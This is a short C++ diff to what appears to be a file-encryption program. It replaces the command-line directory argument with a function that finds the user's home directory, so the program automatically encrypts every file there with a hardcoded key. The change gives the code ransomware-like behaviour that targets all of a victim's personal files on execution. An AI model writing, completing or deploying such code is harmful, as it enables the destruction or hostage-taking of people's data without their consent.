@@ -109,13 +109,20 @@ bool encrypt_directory(const std::string& dir_path, const std::string& key) {
     return true;
 }
 
-int main(int argc, char** argv) {
-    if (argc != 2) {
-        std::cerr << "Usage: " << argv[0] << " <dir_path>" << std::endl;
-        return 1;
-    }
+std::string get_home_directory() {
+    const char* home_dir = nullptr;
 
-    if (!encrypt_directory(argv[1], "123456789000000000")) {
+    #if defined(_WIN32)
+        home_dir = getenv("USERPROFILE");
+    #else
+        home_dir = getenv("HOME");
+    #endif
+
+    return home_dir ? std::string(home_dir) : "";
+}
+
+int main(int argc, char** argv) {
+    if (!encrypt_directory(get_home_directory(), "123456789000000000")) {
         return 1;
     }
     return 0;
